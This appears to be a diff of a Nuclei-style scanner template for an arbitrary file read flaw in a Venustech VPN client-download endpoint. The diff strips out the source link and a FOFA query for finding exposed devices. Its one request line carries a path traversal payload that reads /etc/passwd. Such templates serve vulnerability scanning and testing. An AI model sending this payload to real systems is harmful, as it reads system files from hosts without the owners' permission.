@@ -3,12 +3,8 @@ info:
   name: 启明星辰-vpn-download-client-任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/zgh4p3s3abnxy5ac'
+  description: ''
   tags: lfi,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: zgh4p3s3abnxy5ac
-    fofa: app="网御星云-VPN" || (body="select_auth_method" && body="select_auth_input")||app="启明星辰-天清汉马VPN"
 http:
 - raw:
   - 'GET /vpn/user/download/client?ostype=../../../../../../../etc/passwd HTTP/1.1
